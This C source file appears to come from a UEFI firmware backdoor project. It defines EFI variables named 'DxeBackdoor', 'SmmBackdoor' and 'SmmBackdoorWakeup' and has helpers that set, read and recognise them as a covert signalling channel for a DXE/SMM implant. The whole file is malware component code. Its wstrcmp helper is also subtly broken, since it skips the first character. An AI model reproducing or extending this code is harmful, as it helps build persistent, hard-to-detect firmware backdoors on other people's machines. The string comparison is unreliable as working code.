#include "efivars.h"
#include "globals.h"
#include "Base.h"
#include "common_string.h"

static EFI_GUID dxe_efivar_guid = {
    0x5e888aef,
    0x7780,
    0x4e4a,
    { 0xb2, 0x45, 0xeb, 0x8f, 0x64, 0x8a, 0x74, 0x6c }
};

static EFI_GUID smm_efivar_guid = {
    0x5e888aef,
    0x7780,
    0x5f5b,
    { 0xb2, 0x45, 0xeb, 0x8f, 0x64, 0x8a, 0x74, 0x6c }
};

static EFI_GUID wakeup_efivar_guid = {
    0x5e888aef,
    0x7780,
    0x716c,
    { 0xb2, 0x45, 0xeb, 0x8f, 0x64, 0x8a, 0x74, 0x6c }
};

static CHAR16* dxe_efivar_name = L"DxeBackdoor";
static CHAR16* smm_efivar_name = L"SmmBackdoor";
static CHAR16* wakeup_efivar_name = L"SmmBackdoorWakeup";

static CHAR16* get_var_name(enum BackdoorEfiVar var) {
    switch (var) {
        case DxeVar:    return dxe_efivar_name;
        case SmmVar:    return smm_efivar_name;
        case WakeupVar: return wakeup_efivar_name;
    }

    return NULL;
}

static EFI_GUID* get_var_guid(enum BackdoorEfiVar var) {
    switch (var) {
        case DxeVar:    return &dxe_efivar_guid;
        case SmmVar:    return &smm_efivar_guid;
        case WakeupVar: return &wakeup_efivar_guid;
    }

    return NULL;
}

EFI_STATUS set_backdoor_efivar(enum BackdoorEfiVar var, void* data, UINTN len) {
    CHAR16* name = get_var_name(var);
    EFI_GUID* guid = get_var_guid(var);

    return gRT->SetVariable(name, guid, EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS, len, data); 
}

EFI_STATUS get_backdoor_efivar(enum BackdoorEfiVar var, void* data, UINTN len) {
    UINT32 attrib = 0;
    CHAR16* name = get_var_name(var);
    EFI_GUID* guid = get_var_guid(var);

    return gRT->GetVariable(name, guid, &attrib, &len, data);
}

EFI_STATUS set_backdoor_efivar_str(enum BackdoorEfiVar var, const char* msg) {
    return set_backdoor_efivar(var, (void *) msg, strlen(msg));
}

static BOOLEAN wstrcmp(CHAR16* str1, CHAR16* str2) {
    while (*str1++ && *str2++) {
        if (*str1 != *str2)
            return FALSE;
    }

    return *str1 == 0 && *str2 == 0;
}

BOOLEAN memcmp(void* data1, void* data2, UINT32 size) {
    UINT8 *p1 = (UINT8 *) data1, *p2 = (UINT8 *) data2;

    for (UINT32 i=0; i < size; ++i) {
        if (p1[i] != p2[i])
            return FALSE;
    }

    return TRUE;
}

BOOLEAN is_backdoor_wakeup_var(CHAR16* name, EFI_GUID* guid) {
    return wstrcmp(name, wakeup_efivar_name) && memcmp(guid, &wakeup_efivar_guid, sizeof(wakeup_efivar_guid));
}
